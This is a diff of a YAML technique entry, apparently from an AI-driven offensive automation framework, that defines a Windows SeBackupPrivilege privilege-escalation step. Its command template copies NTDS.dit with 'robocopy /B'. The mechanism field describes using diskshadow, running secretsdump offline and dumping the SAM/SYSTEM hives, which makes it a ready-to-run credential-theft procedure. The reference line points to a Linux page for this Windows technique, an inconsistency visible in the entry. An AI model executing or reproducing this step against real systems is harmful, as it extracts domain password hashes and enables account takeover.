@@ -2,15 +2,20 @@ name: sebackup_privesc
 category: privesc
 description: SeBackupPrivilege exploitation
 preconditions:
-  - os==windows
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "robocopy /B C:\Windows\NTDS C:\temp ntds.dit"
-parser: null
+command_template: 'robocopy /B C:\Windows\NTDS C:\temp ntds.dit
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- backup_priv_used
+- file_read
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "SeBackupPrivilege: read any file regardless of ACL. Use robocopy /B or diskshadow for NTDS.dit, then secretsdump offline. Also works for SAM/SYSTEM hives."
+mechanism: 'SeBackupPrivilege: read any file regardless of ACL. Use robocopy /B or
+  diskshadow for NTDS.dit, then secretsdump offline. Also works for SAM/SYSTEM hives.'
+hacktricks_ref: linux-hardening/privilege-escalation/interesting-groups-linux-pe/README.md
